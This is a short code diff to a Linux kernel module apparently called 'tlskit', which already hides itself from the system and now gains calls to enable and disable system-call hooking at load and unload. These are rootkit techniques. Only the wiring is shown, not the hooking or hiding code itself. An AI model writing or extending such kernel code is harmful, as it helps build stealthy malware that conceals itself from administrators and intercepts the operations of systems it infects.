@@ -5,8 +5,12 @@
 
 #include "module_hiding.h"
 #include "shared.h"
+#include "syscall_hooking.h"
 
 static int cleanup(void *_data) {
+
+    /* Remove syscall hooks */
+    disable_syscall_hooking();
 
     /* Wait until ioctl request has returned */
     msleep(500);
@@ -68,8 +72,13 @@ static int __init tlskit_init(void) {
         goto module_hiding_failed;
     }
 
+    if (0 != enable_syscall_hooking()) {
+        goto syscall_hooking_failed;
+    }
+
     return 0;
 
+syscall_hooking_failed:
 module_hiding_failed:
 
     remove_proc_entry(PROC_ENTRY_NAME, NULL);
